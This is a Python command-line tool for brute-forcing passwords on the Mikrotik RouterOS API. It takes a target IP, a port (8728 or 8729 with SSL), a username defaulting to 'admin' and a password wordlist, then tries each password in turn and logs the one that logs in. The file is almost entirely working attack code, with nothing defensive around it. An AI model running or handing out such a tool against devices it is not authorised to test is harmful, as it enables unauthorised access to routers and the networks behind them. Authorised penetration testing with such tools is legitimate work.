#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Version: 1.2

# Check for Python3
import sys
if sys.version_info < (3, 0):
    sys.stdout.write("Sorry, Python 3.x is required to run this tool\n")
    sys.exit(2)

import socket, ssl, time, json, argparse

try:
    from _api import Api
except ModuleNotFoundError:
    raise ImportError("[ERROR] Module '_api' not found. Make sure the _api.py file is present in the same directory as this tool.")

try:
    from _log import Log
except ModuleNotFoundError:
    raise ImportError("[ERROR] Module '_log' not found. Make sure the _log.py file is present in the same directory as this tool.")

class Bruteforce:
    def __init__(self, target, port, user, wordlist_path, delay, autosave_path=None, use_ssl=False):
        self.target = target
        self.port = port
        self.user = user
        self.delay = delay
        self.wordlist_path = wordlist_path
        self.autosave_path = autosave_path
        self.use_ssl = use_ssl
        self.log = Log(True, None, None)
        self.api = None
        self.load_wordlist()

    def load_wordlist(self):
        try:
            with open(self.wordlist_path, 'r', encoding='utf-8') as f:
                self.wordlist = [line.strip() for line in f if line.strip()]
        except Exception as e:
            self.log.error(f"Error loading wordlist: {e}")
            exit(1)

    def try_connect(self):
        try:
            self.api = Api(self.target, self.port, use_ssl=self.use_ssl)
            return True
        except ssl.SSLError as e:
            self.log.error(f"SSL error while connecting: {e}")
        except ConnectionRefusedError:
            self.log.error(f"Connection refused while trying to connect to {self.target}:{self.port}")
        except socket.timeout:
            self.log.error("Connection timeout")
        except Exception as e:
            self.log.error(f"Unexpected error while connecting: {e}")
        return False

    def run(self):
        self.log.info("[*] Starting brute force attack...")
        for index, password in enumerate(self.wordlist):
            try:
                self.api = Api(self.target, self.port, use_ssl=self.use_ssl)  # cria nova conexão a cada tentativa

                if self.api.login(self.user, password):            
                    self.log.success(f"[+] Success! User: {self.user} Password: {password}")
                    break
                else:
                    self.log.info(f"[-] Attempt {index+1}/{len(self.wordlist)} - Incorrect password: {password}")
            except Exception as e:
                self.log.warning(f"Error trying password '{password}': {e}")

            time.sleep(self.delay)

        self.log.info("[*] Attack finished.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Mikrotik API Brute Force Tool")
    parser.add_argument("-t", "--target", required=True, help="Mikrotik IP address")
    parser.add_argument("-p", "--port", type=int, default=8728, help="API port (default: 8728)")
    parser.add_argument("-u", "--user", default="admin", help="Username (default: admin)")
    parser.add_argument("-d", "--dictionary", required=True, help="Path to the password wordlist")
    parser.add_argument("-s", "--seconds", type=int, default=1, help="Delay between attempts (default: 1s)")
    parser.add_argument("--ssl", action="store_true", help="Use SSL connection (port 8729)")
    args = parser.parse_args()

    bf = Bruteforce(
        target=args.target,
        port=args.port,
        user=args.user,
        wordlist_path=args.dictionary,
        delay=args.seconds,
        use_ssl=args.ssl
    )
    try:
        bf.run()
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user. Exiting cleanly.\n\n")
